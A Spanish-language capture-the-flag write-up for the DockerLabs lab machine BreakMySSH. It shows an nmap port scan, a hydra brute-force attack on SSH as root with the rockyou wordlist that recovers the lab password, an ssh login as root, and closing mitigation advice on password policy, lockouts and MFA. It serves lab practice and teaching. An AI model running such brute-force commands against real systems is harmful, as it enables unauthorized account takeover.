# Writeup: BrakMySSH

- **Máquina:** BreakMySSH (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/16/descargar
- **Dificultad:** Muy Fácil
- **Fecha:** 22 de Octubre 2026

---

## Objetivo
Realizar ataque de fuerza bruta mediante SSH al usuario `root`.

---

## Despliegue de la máquina

<img width="673" height="154" alt="Captura de pantalla (250)" src="https://github.com/user-attachments/assets/e97f51af-6f81-4129-9e74-586331d016fa" />


---

## 1. Reconocimiento
Al utilizar la herramienta `nmap`, se encontró el puerto `ssh` abierto:

```bash
nmap -p- 172.17.0.2
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh
```
--- 

## 2. Identificación de vulnerabilidades
Sabiendo que el objetivo de la máquina es conseguir privilegios `root` y que el puerto `ssh` se encuentra abierto, es posible acceder a las credenciales de `root` mediante ataque de fuerza bruta.


---
## 3. Explotación
### Ataque de fuerza bruta
Se utilizó `hydra` como herramienta para obtener las credenciales `root`.
```bash
$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```
```bash
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
```
Una vez conseguidas las credenciales, procedemos a conectarnos como `root` mediante `ssh`.
```bash
$ ssh root@172.17.0.2 
```

<img width="524" height="100" alt="Captura de pantalla (251)" src="https://github.com/user-attachments/assets/9c390670-8d06-4b41-97fc-c526a9ded339" />

---
## Acciones de mitigación
Las contraseñas simples son vulnerables a ataques de fuerza bruta. Para evitar que un ciberdelincuente se haga con las credenciales de otro usuario, deberían existir políticas de contraseñas más robustas, bloqueos por intentos de inicio de sesión e implementar la verificación en dos pasos (MFA).

---
## Conclusión
BreakMySSH es una máquina simple para la práctica de obtención de credenciales usando diccionarios de `hydra`. 
